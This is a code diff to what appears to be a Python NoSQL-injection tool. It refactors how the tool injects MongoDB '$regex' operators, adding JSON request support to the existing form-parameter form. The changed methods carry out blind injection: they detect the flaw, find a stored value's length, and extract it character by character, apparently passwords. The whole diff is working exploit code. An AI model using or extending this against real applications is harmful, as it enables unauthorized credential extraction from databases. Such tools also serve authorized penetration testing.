@@ -54,11 +54,13 @@ passwords with:");
         self.url = url;
         self.param = param;
         self.scanner = scanner;
+        self.workingdata = scanner.data;
 
     def vulnTest(self):
         data = copy.deepcopy(self.scanner.data);
-        data.pop(self.param);
-        data[self.param+"[$regex]"] = ".";
+        self.injectRegex(data,self.param,".");
+        #data.pop(self.param);
+        #data[self.param+"[$regex]"] = ".";
         req = self.scanner.sendData(data);
         check = self.scanner.check(req);
         if check != "none":
@@ -138,11 +140,16 @@ passwords with:");
     def grabLetter(self,length,var,c):
         try:
             oldVarLength = len(var);
+            if c == "\\":
+                c += c; #Make sure it's escaped
+            if c == "^":
+                c = "\\^"; #Make sure this is escaped. ^ means anything
             c = "[" + c + "]";
             data = copy.deepcopy(self.scanner.data);
-            data.pop(self.param);
-            data[self.param+"[$regex]"] = "^"+"".join(var)+c+".{"+str(length-1-len(var))+"}$";
-            #print("".join(var)+c+".{"+str(length-1-len(var))+"}");
+            self.injectRegex(data,self.param,"^"+"".join(var)+c+".{"+str(length-1-len(var))+"}$");
+            #data.pop(self.param);
+            #data[self.param+"[$regex]"] = "^"+"".join(var)+c+".{"+str(length-1-len(var))+"}$";
+            #print("^"+"".join(var)+c+".{"+str(length-1-len(var))+"}$");
             req = self.scanner.sendData(data);
             check = self.scanner.check(req);
             if check != "none":
@@ -167,8 +174,9 @@ passwords with:");
         for length in range(1,maxLength+1):
             try:
                 data = copy.deepcopy(self.scanner.data);
-                data.pop(self.param);
-                data[self.param+"[$regex]"] = "^(.{"+str(length)+"})$";
+                self.injectRegex(data,self.param,"^(.{"+str(length)+"})$");
+                #data.pop(self.param);
+                #data[self.param+"[$regex]"] = "^(.{"+str(length)+"})$";
                 req = self.scanner.sendData(data);
                 check = self.scanner.check(req);
                 if check != "none":
@@ -184,8 +192,9 @@ passwords with:");
         try:
             length = 1;
             data = copy.deepcopy(self.scanner.data);
-            data.pop(self.param);
-            data[self.param+"[$regex]"] = ".{"+str(length)+"}";
+            self.injectRegex(data,self.param,".{"+str(length)+"}");
+            #data.pop(self.param);
+            #data[self.param+"[$regex]"] = ".{"+str(length)+"}";
             req = self.scanner.sendData(data);
             check = self.scanner.check(req);
             
@@ -195,8 +204,9 @@ passwords with:");
                         return -1;
                 length += 1;
                 data = copy.deepcopy(self.scanner.data);
-                data.pop(self.param);
-                data[self.param+"[$regex]"] = ".{"+str(length)+"}";
+                self.injectRegex(data,self.param,".{"+str(length)+"}");
+                #data.pop(self.param);
+                #data[self.param+"[$regex]"] = ".{"+str(length)+"}";
                 req = self.scanner.sendData(data);
                 check = self.scanner.check(req);
 
@@ -207,6 +217,10 @@ passwords with:");
             failure("Failed to retrieve max length.");
             return -1;
 
-    
-
+    def injectRegex(self,data,param,value):
+        if self.scanner.method == "json":
+            data[param] = {"$regex":value};
+        else:
+            data.pop(self.param);
+            data[self.param+"[$regex]"] = value;
     
